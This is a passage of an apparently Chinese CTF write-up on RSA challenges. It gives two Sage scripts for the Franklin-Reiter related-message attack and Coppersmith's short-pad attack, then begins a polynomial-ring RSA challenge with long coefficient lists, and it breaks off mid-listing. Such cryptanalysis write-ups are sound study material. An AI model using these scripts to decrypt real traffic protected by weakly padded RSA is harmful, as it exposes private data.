<p>所以我们得到了<br>$$<br>\begin{align}<br>c=(2m+3)^{17}\ mod\ n\\<br>c=(4m+11)^{17}\ mod\ n<br>\end{align}<br>$$<br>相当于换一下变量<br>$$<br>c=x^{17}\ mod\ n<br>$$<br>$$<br>c=(2x+5)^{17}\ mod\ n<br>$$<br>我们可以很明显地看到了其中蕴含的线性关系</p>
<blockquote>
<p>Coppersmith’s Short-pad Attack &amp; Related Message Attack（Franklin-Reiter攻击）</p>
</blockquote>
<p>从la佬的博客中据悉，所谓的padding过短，就是对应多项式的根会过小；提供了两个脚本</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本1</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">c1, c2, n, e</span>):</span></span><br><span class="line">    PR.&lt;x&gt;=PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="comment"># replace a,b,c,d</span></span><br><span class="line">    g1 = (a*x+b)^e - c1</span><br><span class="line">    g2 = (c*x+d)^e - c2</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line">c1 =</span><br><span class="line">c2 =</span><br><span class="line">n =</span><br><span class="line">e =</span><br><span class="line">m1 = attack(c1, c2, n, e)</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(<span class="string">&quot;%x&quot;</span> % <span class="built_in">int</span>(m1)))</span><br></pre></td></tr></table></figure>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#脚本2</span></span><br><span class="line"><span class="comment">#Sage</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">short_pad_attack</span>(<span class="params">c1, c2, e, n</span>):</span></span><br><span class="line">    PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRx.&lt;xn&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+y)^e - c2</span><br><span class="line">    q1 = g1.change_ring(PRZZ)</span><br><span class="line">    q2 = g2.change_ring(PRZZ)</span><br><span class="line">    h = q2.resultant(q1)</span><br><span class="line">    h = h.univariate_polynomial()</span><br><span class="line">    h = h.change_ring(PRx).subs(y=xn)</span><br><span class="line">    h = h.monic()</span><br><span class="line">    kbits = n.nbits()//(<span class="number">2</span>*e*e)</span><br><span class="line">    diff = h.small_roots(X=<span class="number">2</span>^kbits, beta=<span class="number">0.4</span>)[<span class="number">0</span>]  <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">    <span class="keyword">return</span> diff</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">related_message_attack</span>(<span class="params">c1, c2, diff, e, n</span>):</span></span><br><span class="line">    PRx.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    g1 = x^e - c1</span><br><span class="line">    g2 = (x+diff)^e - c2</span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">gcd</span>(<span class="params">g1, g2</span>):</span></span><br><span class="line">        <span class="keyword">while</span> g2:</span><br><span class="line">            g1, g2 = g2, g1 % g2</span><br><span class="line">        <span class="keyword">return</span> g1.monic()</span><br><span class="line">    <span class="keyword">return</span> -gcd(g1, g2)[<span class="number">0</span>]</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    n =</span><br><span class="line">    e =</span><br><span class="line">    c1 =</span><br><span class="line">    c2 =</span><br><span class="line">    diff = short_pad_attack(c1, c2, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;difference of two messages is %d&quot;</span> % diff)</span><br><span class="line">    m1 = related_message_attack(c1, c2, diff, e, n)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;m1:&quot;</span>, m1)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;m2:&quot;</span>, m1 + diff)</span><br></pre></td></tr></table></figure>

<p>这道题我们魔改脚本1就能出来，不贴了，之前贴过</p>
<h2 id="unusualrsa3"><a href="#unusualrsa3" class="headerlink" title="unusualrsa3"></a>unusualrsa3</h2><blockquote>
<p>题目描述</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># ********************</span></span><br><span class="line"><span class="comment"># @Author: Lazzaro</span></span><br><span class="line"><span class="comment"># ********************</span></span><br><span class="line"></span><br><span class="line">p:</span><br><span class="line"><span class="number">2470567871</span></span><br><span class="line"></span><br><span class="line">N:</span><br><span class="line"><span class="number">1932231392</span>*x^<span class="number">255</span> + <span class="number">1432733708</span>*x^<span class="number">254</span> + <span class="number">1270867914</span>*x^<span class="number">253</span> + <span class="number">1573324635</span>*x^<span class="number">252</span> + <span class="number">2378103997</span>*x^<span class="number">251</span> + <span class="number">820889786</span>*x^<span class="number">250</span> + <span class="number">762279735</span>*x^<span class="number">249</span> + <span class="number">1378353578</span>*x^<span class="number">248</span> + <span class="number">1226179520</span>*x^<span class="number">247</span> + <span class="number">657116276</span>*x^<span class="number">246</span> + <span class="number">1264717357</span>*x^<span class="number">245</span> + <span class="number">1015587392</span>*x^<span class="number">244</span> + <span class="number">849699356</span>*x^<span class="number">243</span> + <span class="number">1509168990</span>*x^<span class="number">242</span> + <span class="number">2407367106</span>*x^<span class="number">241</span> + <span class="number">873379233</span>*x^<span class="number">240</span> + <span class="number">2391647981</span>*x^<span class="number">239</span> + <span class="number">517715639</span>*x^<span class="number">238</span> + <span class="number">828941376</span>*x^<span class="number">237</span> + <span class="number">843708018</span>*x^<span class="number">236</span> + <span class="number">1526075137</span>*x^<span class="number">235</span> + <span class="number">1499291590</span>*x^<span class="number">234</span> + <span class="number">235611028</span>*x^<span class="number">233</span> + <span class="number">19615265</span>*x^<span class="number">232</span> + <span class="number">53338886</span>*x^<span class="number">231</span> + <span class="number">434434839</span>*x^<span class="number">230</span> + <span class="number">902171938</span>*x^<span class="number">229</span> + <span class="number">516444143</span>*x^<span class="number">228</span> + <span class="number">1984443642</span>*x^<span class="number">227</span> + <span class="number">966493372</span>*x^<span class="number">226</span> + <span class="number">1166227650</span>*x^<span class="number">225</span> + <span class="number">1824442929</span>*x^<span class="number">224</span> + <span class="number">930231465</span>*x^<span class="number">223</span> + <span class="number">1664522302</span>*x^<span class="number">222</span> + <span class="number">1067203343</span>*x^<span class="number">221</span> + <span class="number">28569139</span>*x^<span class="number">220</span> + <span class="number">2327926559</span>*x^<span class="number">219</span> + <span class="number">899788156</span>*x^<span class="number">218</span> + <span class="number">296985783</span>*x^<span class="number">217</span> + <span class="number">1144578716</span>*x^<span class="number">216</span> + <span class="number">340677494</span>*x^<span class="number">215</span> + <span class="number">254306901</span>*x^<span class="number">214</span> + <span class="number">766641243</span>*x^<span class="number">213</span> + <span class="number">1882320336</span>*x^<span class="number">212</span> + <span class="number">2139903463</span>*x^<span class="number">211</span> + <span class="number">1904225023</span>*x^<span class="number">210</span> + <span class="number">475412928</span>*x^<span class="number">209</span> + <span class="number">127723603</span>*x^<span class="number">208</span> + <span class="number">2015416361</span>*x^<span class="number">207</span> + <span class="number">1500078813</span>*x^<span class="number">206</span> + <span class="number">1845826007</span>*x^<span class="number">205</span> + <span class="number">797486240</span>*x^<span class="number">204</span> + <span class="number">85924125</span>*x^<span class="number">203</span> + <span class="number">1921772796</span>*x^<span class="number">202</span> + <span class="number">1322682658</span>*x^<span class="number">201</span> + <span class="number">2372929383</span>*x^<span class="number">200</span> + <span class="number">1323964787</span>*x^<span class="number">199</span> + <span class="number">1302258424</span>*x^<span class="number">198</span> + <span class="number">271875267</span>*x^<span class="number">197</span> + <span class="number">1297768962</span>*x^<span class="number">196</span> + <span class="number">2147341770</span>*x^<span class="number">195</span> + <span class="number">1665066191</span>*x^<span class="number">194</span> + <span class="number">2342921569</span>*x^<span class="number">193</span> + <span class="number">1450622685</span>*x^<span class="number">192</span> + <span class="number">1453466049</span>*x^<span class="number">191</span> + <span class="number">1105227173</span>*x^<span class="number">190</span> + <span class="number">2357717379</span>*x^<span class="number">189</span> + <span class="number">1044263540</span>*x^<span class="number">188</span> + <span class="number">697816284</span>*x^<span class="number">187</span> + <span class="number">647124526</span>*x^<span class="number">186</span> + <span class="number">1414769298</span>*x^<span class="number">185</span> + <span class="number">657373752</span>*x^<span class="number">184</span> + <span class="number">91863906</span>*x^<span class="number">183</span> + <span class="number">1095083181</span>*x^<span class="number">182</span> + <span class="number">658171402</span>*x^<span class="number">181</span> + <span class="number">75339882</span>*x^<span class="number">180</span> + <span class="number">2216678027</span>*x^<span class="number">179</span> + <span class="number">2208320155</span>*x^<span class="number">178</span> + <span class="number">1351845267</span>*x^<span class="number">177</span> + <span class="number">1740451894</span>*x^<span class="number">176</span> + <span class="number">1302531891</span>*x^<span class="number">175</span> + <span class="number">320751753</span>*x^<span class="number">174</span> + <span class="number">1303477598</span>*x^<span class="number">173</span> + <span class="number">783321123</span>*x^<span class="number">172</span> + <span class="number">1400145206</span>*x^<span class="number">171</span> + <span class="number">1379768234</span>*x^<span class="number">170</span> + <span class="number">1191445903</span>*x^<span class="number">169</span> + <span class="number">946530449</span>*x^<span class="number">168</span> + <span class="number">2008674144</span>*x^<span class="number">167</span> + <span class="number">2247371104</span>*x^<span class="number">166</span> + <span class="number">1267042416</span>*x^<span class="number">165</span> + <span class="number">1795774455</span>*x^<span class="number">164</span> + <span class="number">1976911493</span>*x^<span class="number">163</span> + <span class="number">167037165</span>*x^<span class="number">162</span> + <span class="number">1848717750</span>*x^<span class="number">161</span> + <span class="number">573072954</span>*x^<span class="number">160</span> + <span class="number">1126046031</span>*x^<span class="number">159</span> + <span class="number">376257986</span>*x^<span class="number">158</span> + <span class="number">1001726783</span>*x^<span class="number">157</span> + <span class="number">2250967824</span>*x^<span class="number">156</span> + <span class="number">2339380314</span>*x^<span class="number">155</span> + <span class="number">571922874</span>*x^<span class="number">154</span> + <span class="number">961000788</span>*x^<span class="number">153</span> + <span class="number">306686020</span>*x^<span class="number">152</span> + <span class="number">80717392</span>*x^<span class="number">151</span> + <span class="number">2454799241</span>*x^<span class="number">150</span> + <span class="number">1005427673</span>*x^<span class="number">149</span> + <span class="number">1032257735</span>*x^<span class="number">148</span> + <span class="number">593980163</span>*x^<span class="number">147</span> + <span class="number">1656568780</span>*x^<span class="number">146</span> + <span class="number">1865541316</span>*x^<span class="number">145</span> + <span class="number">2003844061</span>*x^<span class="number">144</span> + <span class="number">1265566902</span>*x^<span class="number">143</span> + <span class="number">573548790</span>*x^<span class="number">142</span> + <span class="number">494063408</span>*x^<span class="number">141</span> + <span class="number">1722266624</span>*x^<span class="number">140</span> + <span class="number">938551278</span>*x^<span class="number">139</span> + <span class="number">2284832499</span>*x^<span class="number">138</span> + <span class="number">597191613</span>*x^<span class="number">137</span> + <span class="number">476121126</span>*x^<span class="number">136</span> + <span class="number">1237943942</span>*x^<span class="number">135</span> + <span class="number">275861976</span>*x^<span class="number">134</span> + <span class="number">1603993606</span>*x^<span class="number">133</span> + <span class="number">1895285286</span>*x^<span class="number">132</span> + <span class="number">589034062</span>*x^<span class="number">131</span> + <span class="number">713986937</span>*x^<span class="number">130</span> + <span class="number">1206118526</span>*x^<span class="number">129</span> + <span class="number">311679750</span>*x^<span class="number">128</span> + <span class="number">1989860861</span>*x^<span class="number">127</span> + <span class="number">1551409650</span>*x^<span class="number">126</span> + <span class="number">2188452501</span>*x^<span class="number">125</span> + <span class="number">1175930901</span>*x^<span class="number">124</span> + <span class="number">1991529213</span>*x^<span class="number">123</span> + <span class="number">2019090583</span>*x^<span class="number">122</span> + <span class="number">215965300</span>*x^<span class="number">121</span> + <span class="number">532432639</span>*x^<span class="number">120</span> + <span class="number">1148806816</span>*x^<span class="number">119</span> + <span class="number">493362403</span>*x^<span class="number">118</span> + <span class="number">2166920790</span>*x^<span class="number">117</span> + <span class="number">185609624</span>*x^<span class="number">116</span> + <span class="number">184370704</span>*x^<span class="number">115</span> + <span class="number">2141702861</span>*x^<span class="number">114</span> + <span class="number">223551915</span>*x^<span class="number">113</span> + <span class="number">298497455</span>*x^<span class="number">112</span> + <span class="number">722376028</span>*x^<span class="number">111</span> + <span class="number">678813029</span>*x^<span class="number">110</span> + <span class="number">915121681</span>*x^<span class="number">109</span> + <span class="number">1107871854</span>*x^<span class="number">108</span> + <span class="number">1369194845</span>*x^<span class="number">107</span> + <span class="number">328165402</span>*x^<span class="number">106</span> + <span class="number">1792110161</span>*x^<span class="number">105</span> + <span class="number">798151427</span>*x^<span class="number">104</span> + <span class="number">954952187</span>*x^<span class="number">103</span> + <span class="number">471555401</span>*x^<span class="number">102</span> + <span class="number">68969853</span>*x^<span class="number">101</span> + <span class="number">453598910</span>*x^<span class="number">100</span> + <span class="number">2458706380</span>*x^<span class="number">99</span> + <span class="number">889221741</span>*x^<span class="number">98</span> + <span class="number">320515821</span>*x^<span class="number">97</span> + <span class="number">1549538476</span>*x^<span class="number">96</span> + <span class="number">909607400</span>*x^<span class="number">95</span> + <span class="number">499973742</span>*x^<span class="number">94</span> + <span class="number">552728308</span>*x^<span class="number">93</span> + <span class="number">1538610725</span>*x^<span class="number">92</span> + <span class="number">186272117</span>*x^<span class="number">91</span> + <span class="number">862153635</span>*x^<span class="number">90</span> + <span class="number">981463824</span>*x^<span class="number">89</span> + <span class="number">2400233482</span>*x^<span class="number">88</span> + <span class="number">1742475067</span>*x^<span class="number">87</span> + <span class="number">437801940</span>*x^<span class="number">86</span> + <span class="number">1504315277</span>*x^<span class="number">85</span> + <span class="number">1756497351</span>*x^<span class="number">84</span> + <span class="number">197089583</span>*x^<span class="number">83</span> + <span class="number">2082285292</span>*x^<span class="number">82</span> + <span class="number">109369793</span>*x^<span class="number">81</span> + <span class="number">2197572728</span>*x^<span class="number">80</span> + <span class="number">107235697</span>*x^<span class="number">79</span> + <span class="number">567322310</span>*x^<span class="number">78</span> + <span class="number">1755205142</span>*x^<span class="number">77</span> + <span class="number">1089091449</span>*x^<span class="number">76</span> + <span class="number">1993836978</span>*x^<span class="number">75</span> + <span class="number">2393709429</span>*x^<span class="number">74</span> + <span class="number">170647828</span>*x^<span class="number">73</span> + <span class="number">1205814501</span>*x^<span class="number">72</span> + <span class="number">2444570340</span>*x^<span class="number">71</span> + <span class="number">328372190</span>*x^<span class="number">70</span> + <span class="number">1929704306</span>*x^<span class="number">69</span> + <span class="number">717796715</span>*x^<span class="number">68</span> + <span class="number">1057597610</span>*x^<span class="number">67</span> + <span class="number">482243092</span>*x^<span class="number">66</span> + <span class="number">277530014</span>*x^<span class="number">65</span> + <span class="number">2393168828</span>*x^<span class="number">64</span> + <span class="number">12380707</span>*x^<span class="number">63</span> + <span class="number">1108646500</span>*x^<span class="number">62</span> + <span class="number">637721571</span>*x^<span class="number">61</span> + <span class="number">604983755</span>*x^<span class="number">60</span> + <span class="number">1142068056</span>*x^<span class="number">59</span> + <span class="number">1911643955</span>*x^<span class="number">58</span> + <span class="number">1713852330</span>*x^<span class="number">57</span> + <span class="number">1757273231</span>*x^<span class="number">56</span> + <span class="number">1778819295</span>*x^<span class="number">55</span> + <span class="number">957146826</span>*x^<span class="number">54</span> + <span class="number">900005615</span>*x^<span class="number">53</span> + <span class="number">521467961</span>*x^<span class="number">52</span> + <span class="number">1255707235</span>*x^<span class="number">51</span> + <span class="number">861871574</span>*x^<span class="number">50</span> + <span class="number">397953653</span>*x^<span class="number">49</span> + <span class="number">1259753202</span>*x^<span class="number">48</span> + <span class="number">471431762</span>*x^<span class="number">47</span> + <span class="number">1245956917</span>*x^<span class="number">46</span> + <span class="number">1688297180</span>*x^<span class="number">45</span> + <span class="number">1536178591</span>*x^<span class="number">44</span> + <span class="number">1833258462</span>*x^<span class="number">43</span> + <span class="number">1369087493</span>*x^<span class="number">42</span> + <span class="number">459426544</span>*x^<span class="number">41</span> + <span class="number">418389643</span>*x^<span class="number">40</span> + <span class="number">1800239647</span>*x^<span class="number">39</span> + <span class="number">2467433889</span>*x^<span class="number">38</span> + <span class="number">477713059</span>*x^<span class="number">37</span> + <span class="number">1898813986</span>*x^<span class="number">36</span> + <span class="number">2202042708</span>*x^<span class="number">35</span> + <span class="number">894088738</span>*x^<span class="number">34</span> + <span class="number">1204601190</span>*x^<span class="number">33</span> + <span class="number">1592921228</span>*x^<span class="number">32</span> + <span class="number">2234027582</span>*x^<span class="number">31</span> + <span class="number">1308900201</span>*x^<span class="number">30</span> + <span class="number">461430959</span>*x^<span class="number">29</span> + <span class="number">718926726</span>*x^<span class="number">28</span> + <span class="number">2081988029</span>*x^<span class="number">27</span> + <span class="number">1337342428</span>*x^<span class="number">26</span> + <span class="number">2039153142</span>*x^<span class="number">25</span> + <span class="number">1364177470</span>*x^<span class="number">24</span> + <span class="number">613659517</span>*x^<span class="number">23</span> + <span class="number">853968854</span>*x^<span class="number">22</span> + <span class="number">1013582418</span>*x^<span class="number">21</span> + <span class="number">1167857934</span>*x^<span class="number">20</span> + <span class="number">2014147362</span>*x^<span class="number">19</span> + <span class="number">1083466865</span>*x^<span class="number">18</span> + <span class="number">1091690302</span>*x^<span class="number">17</span> + <span class="number">302196939</span>*x^<span class="number">16</span> + <span class="number">1946675573</span>*x^<span class="number">15</span> + <span class="number">2450124113</span>*x^<span class="number">14</span> + <span class="number">1199066291</span>*x^<span class="number">13</span> + <span class="number">401889502</span>*x^<span class="number">12</span> + <span class="number">712045611</span>*x^<span class="number">11</span> + <span class="number">1850096904</span>*x^<span class="number">10</span> + <span class="number">1808400208</span>*x^<span class="number">9</span> + <span class="number">1567687877</span>*x^<span class="number">8</span> + <span class="number">2013445952</span>*x^<span class="number">7</span> + <span class="number">2435360770</span>*x^<span class="number">6</span> + <span class="number">2414019676</span>*x^<span class="number">5</span> + <span class="number">2277377050</span>*x^<span class="number">4</span> + <span class="number">2148341337</span>*x^<span class="number">3</span> + <span class="number">1073721716</span>*x^<span class="number">2</span> + <span class="number">1045363399</span>*x + <span class="number">1809685811</span></span><br><span class="line"></span><br><span class="line">m^<span class="number">0x10001</span>%N:  </span><br><span class="line"><span class="number">922927962</span>*x^<span class="number">254</span> + <span class="number">1141958714</span>*x^<span class="number">253</span> + <span class="number">295409606</span>*x^<span class="number">252</span> + <span class="number">1197491798</span>*x^<span class="number">251</span> + <span class="number">2463440866</span>*x^<span class="number">250</span> + <span class="number">1671460946</span>*x^<span class="number">249</span> + <span class="number">967543123</span>*x^<span class="number">248</span> + <span class="number">119796323</span>*x^<span class="number">247</span> + <span class="number">1172760592</span>*x^<span class="number">246</span> + <span class="number">770640267</span>*x^<span class="number">245</span> + <span class="number">1093816376</span>*x^<span class="number">244</span> + <span class="number">196379610</span>*x^<span class="number">243</span> + <span class="number">2205270506</span>*x^<span class="number">242</span> + <span class="number">459693142</span>*x^<span class="number">241</span> + <span class="number">829093322</span>*x^<span class="number">240</span> + <span class="number">816440689</span>*x^<span class="number">239</span> + <span class="number">648546871</span>*x^<span class="number">238</span> + <span class="number">1533372161</span>*x^<span class="number">237</span> + <span class="number">1349964227</span>*x^<span class="number">236</span> + <span class="number">2132166634</span>*x^<span class="number">235</span> + <span class="number">403690250</span>*x^<span class="number">234</span> + <span class="number">835793319</span>*x^<span class="number">233</span> + <span class="number">2056945807</span>*x^<span class="number">232</span> + <span class="number">480459588</span>*x^<span class="number">231</span> + <span class="number">1401028924</span>*x^<span class="number">230</span> + <span class="number">2231055325</span>*x^<span class="number">229</span> + <span class="number">1716893325</span>*x^<span class="number">228</span> + <span class="number">16299164</span>*x^<span class="number">227</span> + <span class="number">1125072063</span>*x^<span class="number">226</span> + <span class="number">1903340994</span>*x^<span class="number">225</span> + <span class="number">1372971897</span>*x^<span class="number">224</span> + <span class="number">242927971</span>*x^<span class="number">223</span> + <span class="number">711296789</span>*x^<span class="number">222</span> + <span class="number">535407256</span>*x^<span class="number">221</span> + <span class="number">976773179</span>*x^<span class="number">220</span> + <span class="number">533569974</span>*x^<span class="number">219</span> + <span class="number">501041034</span>*x^<span class="number">218</span> + <span class="number">326232105</span>*x^<span class="number">217</span> + <span class="number">2248775507</span>*x^<span class="number">216</span> + <span class="number">1010397596</span>*x^<span class="number">215</span> + <span class="number">1641864795</span>*x^<span class="number">214</span> + <span class="number">1365178317</span>*x^<span class="number">213</span> + <span class="number">1038477612</span>*x^<span class="number">212</span> + <span class="number">2201213637</span>*x^<span class="number">211</span> + <span class="number">760847531</span>*x^<span class="number">210</span> + <span class="number">2072085932</span>*x^<span class="number">209</span> + <span class="number">168159257</span>*x^<span class="number">208</span> + <span class="number">70202009</span>*x^<span class="number">207</span> + <span class="number">1193933930</span>*x^<span class="number">206</span> + <span class="number">1559162272</span>*x^<span class="number">205</span> + <span class="number">1380642174</span>*x^<span class="number">204</span> + <span class="number">1296625644</span>*x^<span class="number">203</span> + <span class="number">1338288152</span>*x^<span class="number">202</span> + <span class="number">843839510</span>*x^<span class="number">201</span> + <span class="number">460174838</span>*x^<span class="number">200</span> + <span class="number">660412151</span>*x^<span class="number">199</span> + <span class="number">716865491</span>*x^<span class="number">198</span> + <span class="number">772161222</span>*x^<span class="number">197</span> + <span class="number">924177515</span>*x^<span class="number">196</span> + <span class="number">1372790342</span>*x^<span class="number">195</span> + <span class="number">320044037</span>*x^<span class="number">194</span> + <span class="number">117027412</span>*x^<span class="number">193</span> + <span class="number">814803809</span>*x^<span class="number">192</span> + <span class="number">1175035545</span>*x^<span class="number">191</span> + <span class="number">244769161</span>*x^<span class="number">190</span> + <span class="number">2116927976</span>*x^<span class="number">189</span> + <span class="number">617780431</span>*x^<span class="number">188</span> + <span class="number">342577832</span>*x^<span class="number">187</span> + <span class="number">356586691</span>*x^<span class="number">186</span> + <span class="number">695795444</span>*x^<span class="number">185</span> + <span class="number">281750528</span>*x^<span class="number">184</span> + <span class="number">133432552</span>*x^<span class="number">183</span> + <span class="number">741747447</span>*x^<span class="number">182</span> + <span class="number">2138036298</span>*x^<span class="number">181</span> + <span class="number">524386605</span>*x^<span class="number">180</span> + <span class="number">1231287380</span>*x^<span class="number">179</span> + <span class="number">1246706891</span>*x^<span class="number">178</span> + <span class="number">69277523</span>*x^<span class="number">177</span> + <span class="number">2124927225</span>*x^<span class="number">176</span> + <span class="number">2334697345</span>*x^<span class="number">175</span> + <span class="number">1769733543</span>*x^<span class="number">174</span> + <span class="number">2248037872</span>*x^<span class="number">173</span> + <span class="number">1899902290</span>*x^<span class="number">172</span> + <span class="number">409421149</span>*x^<span class="number">171</span> + <span class="number">1223261878</span>*x^<span class="number">170</span> + <span class="number">666594221</span>*x^<span class="number">169</span> + <span class="number">1795456341</span>*x^<span class="number">168</span> + <span class="number">406003299</span>*x^<span class="number">167</span> + <span class="number">992699270</span>*x^<span class="number">166</span> + <span class="number">2201384104</span>*x^<span class="number">165</span> + <span class="number">907692883</span>*x^<span class="number">164</span> + <span class="number">1667882231</span>*x^<span class="number">163</span> + <span class="number">1414341647</span>*x^<span class="number">162</span> + <span class="number">1592159752</span>*x^<span class="number">161</span> + <span class="number">28054099</span>*x^<span class="number">160</span> + <span class="number">2184618098</span>*x^<span class="number">159</span> + <span class="number">2047102725</span>*x^<span class="number">158</span> + <span class="number">103202495</span>*x^<span class="number">157</span> + <span class="number">1803852525</span>*x^<span class="number">156</span> + <span class="number">446464179</span>*x^<span class="number">155</span> + <span class="number">909116906</span>*x^<span class="number">154</span> + <span class="number">1541693644</span>*x^<span class="number">153</span> + <span class="number">166545130</span>*x^<span class="number">152</span> + <span class="number">2283548843</span>*x^<span class="number">151</span> + <span class="number">2348768005</span>*x^<span class="number">150</span> + <span class="number">71682607</span>*x^<span class="number">149</span> + <span class="number">484339546</span>*x^<span class="number">148</span> + <span class="number">669511666</span>*x^<span class="number">147</span> + <span class="number">2110974006</span>*x^<span class="number">146</span> + <span class="number">1634563992</span>*x^<span class="number">145</span> + <span class="number">1810433926</span>*x^<span class="number">144</span> + <span class="number">2388805064</span>*x^<span class="number">143</span> + <span class="number">1200258695</span>*x^<span class="number">142</span> + <span class="number">1555191384</span>*x^<span class="number">141</span> + <span class="number">363842947</span>*x^<span class="number">140</span> + <span class="number">1105757887</span>*x^<span class="number">139</span> + <span class="number">402111289</span>*x^<span class="number">138</span> + <span class="number">361094351</span>*x^<span class="number">137</span> + <span class="number">1788238752</span>*x^<span class="number">136</span> + <span class="number">2017677334</span>*x^<span class="number">135</span> + <span class="number">1506224550</span>*x^<span class="number">134</span> + <span class="number">648916609</span>*x^<span class="number">133</span> + <span class="number">2008973424</span>*x^<span class="number">132</span> + <span class="number">2452922307</span>*x^<span class="number">131</span> + <span class="number">1446527028</span>*x^<span class="number">130</span> + <span class="number">29659632</span>*x^<span class="number">129</span> + <span class="number">627390142</span>*x^<span class="number">128</span> + <span class="number">1695661760</span>*x^<span class="number">127</span> + <span class="number">734686497</span>*x^<span class="number">126</span> + <span class="number">227059690</span>*x^<span class="number">125</span> + <span class="number">1219692361</span>*x^<span class="number">124</span> + <span class="number">635166359</span>*x^<span class="number">123</span> + <span class="number">428703291</span>*x^<span class="number">122</span> + <span class="number">2334823064</span>*x^<span class="number">121</span> + <span class="number">204888978</span>*x^<span class="number">120</span> + <span class="number">1694957361</span>*x^<span class="number">119</span> + <span class="number">94211180</span>*x^<span class="number">118</span> + <span class="number">2207723563</span>*x^<span class="number">117</span> + <span class="number">872340606</span>*x^<span class="number">116</span> + <span class="number">46197669</span>*x^<span class="number">115</span> + <span class="number">710312088</span>*x^<span class="number">114</span> + <span class="number">305132032</span>*x^<span class="number">113</span> + <span class="number">1621042631</span>*x^<span class="number">112</span> + <span class="number">2023404084</span>*x^<span class="number">111</span> + <span class="number">2169254305</span>*x^<span class="number">110</span> + <span class="number">463525650</span>*x^<span class="number">109</span> + <span class="number">2349964255</span>*x^<span class="number">108</span> + <span class="number">626689949</span>*x^<span class="number">107</span> + <span class="number">2072533779</span>*x^<span class="number">106</span> + <span class="number">177264308</span>*x^<span class="number">105</span> + <span class="number">153948342</span>*x^<span class="number">104</span> + <span class="number">1992646054</span>*x^<span class="number">103</span> + <span class="number">2379817214</span>*x^<span class="number">102</span> + <span class="number">1396334187</span>*x^<span class="number">101</span> + <span class="number">2254165812</span>*x^<span class="number">100</span> + <span class="number">1300455472</span>*x^<span class="number">99</span> + <span class="number">2396842759</span>*x^<span class="number">98</span> + <span class="number">2398953180</span>*x^<span class="number">97</span> + <span class="number">88249450</span>*x^<span class="number">96</span> + <span class="number">1726340322</span>*x^<span class="number">95</span> + <span class="number">2004986735</span>*x^<span class="number">94</span> + <span class="number">2446249940</span>*x^<span class="number">93</span> + <span class="number">520126803</span>*x^<span class="number">92</span> + <span class="number">821544954</span>*x^<span class="number">91</span> + <span class="number">1177737015</span>*x^<span class="number">90</span> + <span class="number">676286546</span>*x^<span class="number">89</span> + <span class="number">1519043368</span>*x^<span class="number">88</span> + <span class="number">224894464</span>*x^<span class="number">87</span> + <span class="number">1742023262</span>*x^<span class="number">86</span> + <span class="number">142627164</span>*x^<span class="number">85</span> + <span class="number">1427710141</span>*x^<span class="number">84</span> + <span class="number">1504189919</span>*x^<span class="number">83</span> + <span class="number">688315682</span>*x^<span class="number">82</span> + <span class="number">1397842239</span>*x^<span class="number">81</span> + <span class="number">435187331</span>*x^<span class="number">80</span> + <span class="number">433176780</span>*x^<span class="number">79</span> + <span class="number">454834357</span>*x^<span class="number">78</span> + <span class="number">1046713282</span>*x^<span class="number">77</span> + <span class="number">1208458516</span>*x^<span class="number">76</span> + <span class="number">811240741</span>*x^<span class="number">75</span> + <span class="number">151611952</span>*x^<span class="number">74</span> + <span class="number">164192249</span>*x^<span class="number">73</span> + <span class="number">353336244</span>*x^<span class="number">72</span> + <span class="number">1779538914</span>*x^<span class="number">71</span> + <span class="number">1489144873</span>*x^<span class="number">70</span> + <span class="number">213140082</span>*x^<span class="number">69</span> + <span class="number">1874778522</span>*x^<span class="number">68</span> + <span class="number">908618863</span>*x^<span class="number">67</span> + <span class="number">1058334731</span>*x^<span class="number">66</span> + <span class="number">1706255211</span>*x^<span class="number">65</span> + <span class="number">708134837</span>*x^<span class="number">64</span> + <span class="number">1382118347</span>*x^<span class="number">63</span> + <span class="number">2111915733</span>*x^<span class="number">62</span> + <span class="number">1273497300</span>*x^<span class="number">61</span> + <span class="number">368639880</span>*x^<span class="number">60</span> + <span class="number">1652005004</span>*x^<span class="number">59</span> + <span class="number">1977610754</span>*x^<span class="number">58</span> + <span class="number">1412680185</span>*x^<span class="number">57</span> + <span class="number">2312775720</span>*x^<span class="number">56</span> + <span class="number">59793381</span>*x^<span class="number">55</span> + <span class="number">1345145822</span>*x^<span class="number">54</span> + <span class="number">627534850</span>*x^<span class="number">53</span> + <span class="number">2159477761</span>*x^<span class="number">52</span> + <span class="number">10450988</span>*x^<span class="number">51</span> + <span class="number">1479007796</span>*x^<span class="number">50</span> + <span class="number">2082579205</span>*x^<span class="number">49</span> + <span class="number">1158447154</span>*x^<span class="number">48</span> + <span class="number">126359830</span>*x^<span class="number">47</span> + <span class="number">393411272</span>*x^<span class="number">46</span> + <span class="number">2343384236</span>*x^<span class="number">45</span> + <span class="number">2191577465</span>*x^<span class="number">44</span> + <span class="number">1281188680</span>*x^<span class="number">43</span> + <span 